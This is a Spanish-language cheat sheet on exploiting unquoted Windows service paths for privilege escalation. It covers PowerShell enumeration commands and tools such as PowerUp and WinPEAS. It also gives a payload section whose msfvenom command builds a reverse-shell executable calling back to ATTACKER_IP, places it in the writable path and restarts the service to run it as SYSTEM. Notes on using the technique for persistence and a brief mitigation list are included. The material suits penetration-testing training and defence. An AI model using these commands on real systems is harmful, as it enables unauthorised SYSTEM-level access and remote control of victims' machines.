# 🛠️ Unquoted Service Paths - Cheat Sheet

## 🧠 Concepto

El vector de ataque **Unquoted Service Path** (Rutas de servicio sin comillas) se basa en rutas mal configuradas en servicios de Windows. Si el binario de un servicio tiene espacios en su ruta y no está entre comillas, Windows intentará ejecutar cada parte del camino secuencialmente hasta encontrar un ejecutable. Esto puede permitir a un atacante con permisos de escritura en alguna de esas rutas inyectar un ejecutable malicioso.

## ✅ Requisitos

* El servicio corre con privilegios elevados (por ejemplo, SYSTEM).
* La ruta del binario del servicio contiene espacios y **no está entrecomillada**.
* El atacante tiene **permisos de escritura** en alguna carpeta dentro de esa ruta.

## 🔁 Flujo de ataque

1. **Enumerar servicios vulnerables** (sin comillas y con espacios).
2. **Identificar directorios donde se tiene permiso de escritura**.
3. **Colocar un ejecutable malicioso** (payload) en esa ruta.
4. **Reiniciar el servicio** (si es posible) o esperar a que reinicie.

---

## 🔍 Enumeración (PowerShell)

```powershell
# Ver servicios sin comillas en sus rutas
Get-WmiObject win32_service | Where-Object { $_.PathName -notlike '"*"' -and $_.PathName -like '* *' } |
Select-Object Name, DisplayName, PathName, StartMode

# Alternativa con más control
Get-CimInstance -ClassName Win32_Service |
Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '^"' } |
Select-Object Name, StartMode, PathName

# Verificar permisos sobre rutas potenciales
icacls "C:\Program Files\Some Folder"
```

## 🛠️ Herramientas útiles

* `accesschk.exe` de Sysinternals:

```bash
accesschk.exe -uwcqv "Users" "C:\Program Files"
```

* `PowerUp.ps1` (PowerSploit):

```powershell
Invoke-AllChecks | Out-String | Select-String Unquoted
```

* `SharpUp.exe` o `WinPEAS.exe` (enumeración automática).

## 📌 Ejemplo

### Ruta vulnerable:

```
C:\Program Files\Some Folder\My App\app.exe
```

### Lo que intenta ejecutar Windows si no hay comillas:

1. `C:\Program.exe`
2. `C:\Program Files\Some.exe`
3. `C:\Program Files\Some Folder\My.exe`
4. `C:\Program Files\Some Folder\My App\app.exe`

### Exploiting:

Si puedes escribir en `C:\Program Files\Some Folder\`, puedes colocar un `My.exe` con un payload y al reiniciar el servicio, se ejecutará como SYSTEM.

---

## ⚙️ Payload de prueba (PowerShell):

```powershell
# Compilar un exe con msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o My.exe

# Copiar payload en la ruta vulnerable
copy .\My.exe "C:\Program Files\Some Folder\"

# Reiniciar el servicio (si se tiene acceso)
Restart-Service -Name "NombreServicio"
```

---

## 🧼 Mitigación (Blue Team)

* Siempre entrecomillar rutas con espacios.
* Asignar permisos adecuados a carpetas del sistema.
* Utilizar herramientas como `accesschk` y revisiones periódicas con scripts defensivos.

## 🧾 Notas

* Si no puedes reiniciar el servicio, busca un cronograma (Scheduled Task) o espera un reinicio del sistema.
* Este vector puede usarse también para persistencia si colocas un binario en rutas comunes usadas por múltiples servicios mal configurados.

---

## 📚 Referencias

* [https://attack.mitre.org/techniques/T1574/009/](https://attack.mitre.org/techniques/T1574/009/)
* PowerSploit, WinPEAS, SharpUp
